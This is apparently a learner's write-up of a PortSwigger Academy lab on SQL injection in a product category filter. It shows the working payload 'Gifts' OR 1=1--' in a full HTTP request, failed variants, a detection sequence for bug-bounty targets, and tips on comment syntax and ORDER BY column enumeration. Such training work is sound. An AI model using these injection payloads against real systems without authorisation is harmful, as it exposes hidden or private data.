# LAB: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

|                             |                                                                                                         |
| --------------------------- | ------------------------------------------------------------------------------------------------------- |
| **Topic**                   | SQL injection                                                                                           |
| **Difficulty**              | Apprentice                                                                                              |
| **Date**                    | 2026-11-10                                                                                              |
| **Time**                    | ~15m                                                                                                    |
| **Solved without solution** | yes                                                                                                     |
| **Link**                    | [lab-retrieve-hidden-data](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data) |

## 1. Objective

Perform a SQL injection attack that causes the application to display one or more unreleased products.

## 2. Surface

`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`
Query parameter in category filter URL: `GET /filter?category=Gifts`.
The amount goes directly into the 'WHERE' clause of the bank query-is the default
"my input became part of a SQL statement."

## 3. Hypothesis

If the backend mounts 'SELECT... FROM products WHERE category = '<input>",
then injecting a `'` might generate some result that shows there is a sql injection possibility.
After this, i got a 500 status, that means, might be possible to be.

So, if I want **all** rows, I can try adding a filter that is always true to return
including the ones the filter normally hides.

## 4. Payload that worked

```http
GET /filter?category=Gifts'+OR+1=1-- HTTP/2
Host: xxxx.web-security-academy.net
Cookie: session=xxxx
Sec-Ch-Ua: "Not:A-Brand";v="8", "Chromium";v="156"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/jxl,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://xxx.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```

Response:

```
200
 <h4>Congratulations, you solved the lab!</h4>
```

## 5. Why it works

A final query turns into: SELECT \* FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1 OR 1=1 is always green and the - comments on AND released = 1, which was exactly the filter hiding the products.

## 6. What I tried that failed

' OR 1=1# → # did not work as a comment on this stack.
' OR 1=1 no comment → error 500, because the final ' was left in the query.
Learning: The comment is what fixes the query syntactically; without it, the payload breaks before it takes effect.
https://www.w3schools.com/sql/sql_comments.asp

## 7. In a real target (bounty translation)

Typical context: category filter, search, sort, pagination-any parameter that becomes WHERE.
Quick detection: ' → 500 or empty content; '- → back to normal; ' AND 1=2- → empty list; ' AND 1=1- → full list. This sequence is already proof of injection without needing sensitive data.
Reportable impact: exposure of hidden/archived records; with UNION, leakage of other tables.
Probable severity: Medium alone (internal data exposed); goes up to High if credential or PII leaks.

## 8. Bypass / variants noticed

Comment by stack: - (required space), # (MySQL), /\* \*/.
Enumeration of columns by ORDER BY n before any UNION.
View Essential skills → Obfuscating attacks using encodings for filters.

## 9. Takeaway (one line)

Every filter/order parameter is a candidate: test ' for error, then '- to normalize, then AND 1=1 vs AND 1=2 to confirm control of logic.
